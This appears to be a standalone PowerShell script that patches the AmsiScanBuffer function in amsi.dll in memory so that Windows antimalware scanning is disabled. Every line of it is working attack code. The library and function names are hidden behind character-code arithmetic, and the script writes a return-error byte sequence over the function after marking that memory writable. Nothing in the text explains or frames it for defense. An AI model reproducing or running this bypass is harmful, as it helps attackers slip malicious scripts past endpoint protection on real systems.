$jurii = @"
using System;
using System.Runtime.InteropServices;
public class jurii {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr kphtsp, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $jurii

$kmvetnc = [jurii]::LoadLibrary("$(('âmsì.'+'dll').nOrmAliZE([chAR](70*38/38)+[chAR](111*15/15)+[CHAr](101+13)+[cHaR]([ByTe]0x6d)+[ChAr](68*32/32)) -replace [chAR]([BYTE]0x5c)+[chAR]([BytE]0x70)+[chaR](123+17-17)+[chaR](77+64-64)+[ChAr](110)+[cHAr]([bYtE]0x7d))")
$lqxiah = [jurii]::GetProcAddress($kmvetnc, "$([cHaR]([BytE]0x41)+[cHAr](109+83-83)+[char](115*103/103)+[chaR](105*81/81)+[char]([Byte]0x53)+[chAR](99+58-58)+[ChAr]([bYte]0x61)+[CHar]([bYTe]0x6e)+[cHAr]([BYTE]0x42)+[char]([BYte]0x75)+[ChaR](95+7)+[CHar]([BytE]0x66)+[CHAr]([ByTe]0x65)+[Char]([BYte]0x72))")
$p = 0
$axwv = "0xC3"
$gsgh = "0x57"
[jurii]::VirtualProtect($lqxiah, [uint32]5, 0x40, [ref]$p)
$umpa = "0x07"
$qplr = "0xB8"
$rtxk = "0x80"
$qpah = "0x00"
$vrivv = [Byte[]] ($qplr,$gsgh,$qpah,$umpa,+$rtxk,+$axwv)
[System.Runtime.InteropServices.Marshal]::Copy($vrivv, 0, $lqxiah, 6)
